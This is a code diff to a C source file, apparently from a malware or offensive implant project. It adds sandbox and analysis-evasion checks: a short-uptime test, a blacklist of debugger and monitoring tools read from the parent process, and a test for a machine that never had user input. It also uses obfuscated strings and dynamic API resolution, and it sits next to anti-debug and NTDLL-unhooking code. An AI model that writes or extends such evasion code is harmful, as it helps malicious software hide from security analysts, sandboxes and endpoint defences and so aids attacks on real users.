@@ -86,8 +86,73 @@ BOOL IsDebugged(void) {
     return FALSE;
 }
 
+/* ── Uptime check ────────────────────────────────────────────────────────── */
+/* Sandbox VMs are typically freshly restored; legitimate endpoints have been
+ * running for at least a few minutes.  180 s threshold catches most snapshots. */
+static BOOL LowUptime(void) {
+    return GetTickCount64() < (3ULL * 60 * 1000);
+}
+
+/* ── Parent process blacklist ─────────────────────────────────────────────── */
+static BOOL SuspiciousParent(void) {
+    NT_PROCESS_BASIC_INFO pbi;
+    ULONG retLen = 0;
+    if (!NT_SUCCESS(NtQueryProcInfo((HANDLE)(LONG_PTR)-1,
+                                    (PROCESSINFOCLASS)0,
+                                    &pbi, sizeof(pbi), &retLen)))
+        return FALSE;
+    DWORD ppid = (DWORD)pbi.InheritedFromUniqueProcessId;
+    if (!ppid) return FALSE;
+
+    HANDLE hParent = NULL;
+    if (!NT_SUCCESS(NtOpenProc(ppid, PROCESS_QUERY_LIMITED_INFORMATION, &hParent)))
+        return FALSE;
+
+    char path[MAX_PATH] = {0};
+    DWORD plen = MAX_PATH;
+    HMODULE k32 = GetModuleHandleA(OBFSTR("kernel32.dll"));
+    typedef BOOL (WINAPI *pfnQFPI)(HANDLE, DWORD, LPSTR, PDWORD);
+    pfnQFPI pFn = k32 ? (pfnQFPI)(FARPROC)GetProcAddress(k32, OBFSTR("QueryFullProcessImageNameA")) : NULL;
+    BOOL got = pFn ? pFn(hParent, 0, path, &plen) : FALSE;
+    CloseHandle(hParent);
+    if (!got || !plen) return FALSE;
+
+    /* Extract basename and lowercase */
+    int last = -1;
+    for (int i = 0; path[i]; i++)
+        if (path[i] == '\\' || path[i] == '/') last = i;
+    char *name = path + last + 1;
+    for (int i = 0; name[i]; i++)
+        if (name[i] >= 'A' && name[i] <= 'Z') name[i] += 32;
+
+    const char *bad[] = {
+        OBFSTR("x64dbg.exe"),    OBFSTR("x32dbg.exe"),
+        OBFSTR("ollydbg.exe"),   OBFSTR("windbg.exe"),
+        OBFSTR("idaq.exe"),      OBFSTR("idaq64.exe"),
+        OBFSTR("procmon.exe"),   OBFSTR("procmon64.exe"),
+        OBFSTR("wireshark.exe"), OBFSTR("fiddler.exe"),
+    };
+    for (int i = 0; i < (int)ARRAY_SIZE(bad); i++)
+        if (strcmp(name, bad[i]) == 0) return TRUE;
+    return FALSE;
+}
+
+/* ── Last-input idle ─────────────────────────────────────────────────────── */
+/* A machine where the last input time equals (or exceeds) the system uptime
+ * has never received real human input — characteristic of a headless sandbox. */
+static BOOL NeverHadInput(void) {
+    LASTINPUTINFO lii;
+    lii.cbSize = sizeof(lii);
+    if (!GetLastInputInfo(&lii)) return FALSE;
+    DWORD now    = GetTickCount();
+    DWORD idleMs = now - lii.dwTime;
+    /* Idle since boot (with ±5 s tolerance for early input at login screen) */
+    return idleMs + 5000 >= (DWORD)GetTickCount64();
+}
+
 BOOL IsSandbox(void) {
-    return TimingSandboxCheck() || IsVM() || IsDebugged();
+    return TimingSandboxCheck() || IsVM() || IsDebugged()
+        || LowUptime() || SuspiciousParent() || NeverHadInput();
 }
 
 /* ── NTDLL unhooking ─────────────────────────────────────────────────────── */
